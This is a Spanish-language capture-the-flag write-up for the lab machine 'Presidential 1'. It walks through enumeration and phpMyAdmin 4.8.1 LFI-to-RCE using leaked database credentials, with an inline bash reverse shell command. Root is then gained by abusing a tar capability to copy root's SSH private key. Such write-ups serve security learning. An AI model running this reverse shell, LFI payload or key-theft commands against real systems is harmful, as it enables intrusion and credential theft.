# Presidential 1

Tags: [[_webFuzzing]],[[_infoLeakage]],[[_lfi]],[[_webExploitation]],[[_cracking]],[[_capabilities]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible CentOS.

Puertos abiertos.

80 - HTTP. Interpreta PHP.

2082 -  OPEN SSH Versión 7.4.

## Investigación (Intrusión)
(Reconocimiento/Enumeración).

80.
Empezaremos a enumerar la web hasta encontrar usuarios que puedan estar configurados a nivel de sistema.

whatweb. Nos da correos, y un posible dominio "votenow.local"

Desde la web.
Es sobre elecciones presidenciales.

Wappalyzer reporta que usa librerías:
AOS.
Isotope.
jQuery.

Leguaje Programación:
PHP

Podemos ver posibles usuarios:
kelly bowen
hugh morgan

Contemplemos el dominio para ver si cambia en algo.
Pero parece ser lo mismo.
RECORDATORIO. Fuzzear subdominios.

Fuezzeemos URIs.
/assets :    directory listing.
Curioso, hay imágenes que deben estar en algún lado puestas.

Fuzzear SubDominios.
"datasafe" -> datasafe.votenow.local
whatweb.
Parece ser un panel de autenticación, justo lo que veíamos en /assets, eso tenía pinta.

Es el phpMyAdmin de MySQL.

Fuezzeemos. Por extensiones PHP también.
/README :    phpMyAdmin 4.8.1
/ChangeLog :    son las vulnerabilidades que tenían y mejoras.
/icons/ :    imágenes para usar.
/setup/ :    es el setup de phpMyAdmin
/sql.php/  :    se queda en blanco. Pero el código fuente es el mismo.
/url.php/ :    es interesante, porque lo habíamos visto, hace como una redirección.

Analicemos este /setup/
No se pude hacer mucho.


Parece que por aquí no va la cosa, así que volvamos al votenow.local porque algo debemos estar obviando.

Fuzzeemos mejor.
Por extensiones: php, js, txt, bak, git, php.bak
Encontramos
/config.php.bak :    en el código fuente se ven cosas turbias.

DataBase:
db: votebox
dbPass: casoj3FFASPsbyoRP
dbHost: localhost
dbName: votebox

Mmm, podría ser lo de phpMyAdmin. Efectivamente, pa deentro.

En la base de datos está un usuario admin con una contraseña cifrada. Puedo intentar crackearla o romperla.

Parece que es Brcypt.

Se la voy a cambiar por otra Bcrypt, pero con "password123"

Puedo entrar ahora como admin. Aunque no sé si sea necesario.

Como es version 8.4.1 es propenso a LFI y a un RCE  (Searchsploit).
LFI.
Usuario admin a nivel de sistema.

Si yo pruebo por ssh por 2082, no me permite poner contraseña, debería usar un fichero de identidad.


RCE.
Lo que hace el exploit es aprovechar el LFI para derivarlo a un RCE.

El exploit 
php/webapps/50457.py :    tiene una falla, debe ser /var/lib/php/session/, "session" en lugar de "sessions". Así sí ejecuta comandos de forma remota.
La forma de ejecutarlo sería
<span style="color:#88c425">python3 50457.py datasafe.votenow.local 80 /index.php votebox casoj3FFASPsbyoRP "bash -i >& /dev/tcp/192.168.0.13/443 0>&1"</span>


<span style="color:#bef202">De forma manual.</span>
Lo que podemos hacer es apuntar a 
<span style="color:#ecacb6">/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{mi identificador de sesión}</span>

Este es el identificador de sesión, SessionID.
![[Pasted image 20240713193226.png]]

Y como la web trabaja con PHP, debería de interpretarlo.

Me pongo en escucha por el 443.

En el MySQL
Si yo aplico esta sentencia está claro que no lo va a interpretar.
![[Pasted image 20240713193812.png]]

Pero con el LFI hacemos que apunte a la sesión.
Ya que en ese lugar se está guardando todo, entonces lo va a interpretar.


De esta manera o con el script, pa deeentro.


2082.
Probemos si se pueden enumerar usuarios, puesto que es versión 7.4
No se pueden enumerar usuarios. Así que esperemos a tener credenciales válidas.


## Escalada

Enumerar todo el sistema.
Efectivamente, CentOS.

Recordando, teníamos un hash, podemos intentar crackearlo para ver si nos resulta la contraseña de admin:Stella
Ahí la rompe.
![[Pasted image 20240714043650 1.png]]

Hacemos migración.
<span style="color:#bef202">Elevar a root.</span>

Ver todo.
Hay un notex.txt
Dice que utilicemos nuevos comandos para backup y comprimir archivos sensibles.

Hay uno que es 
<span style="color:#ecacb6">/usr/bin/tarS</span> 
Con esta capabilitie
<span style="color:#ecacb6">cap_dac_read_search+ep</span> 
La cual permite leer otros archivos.

Pensando en una id_rsa en el .ssh de root, podemo intentar leerlo.
<span style="color:#88c425">/usr/bin/tarS -czf /tmp/rsa.tar.gz /root/.ssh/id_rsa</span>
Descomprimimos
<span style="color:#88c425">gunzip rsa.tar.gz</span>
Y lo leemos.

Eso me lo guardo como <span style="color:#ecacb6">id_rsa</span> o el nombre que sea, en mi equipo. 
Le damos permisos 600.
Recordemos que el SSH está en 2082
Hacemos
<span style="color:#88c425">ssh 192.168.0.12 -i id_rsa -p 2082</span>

Y pa deeeeentro.
FIN.
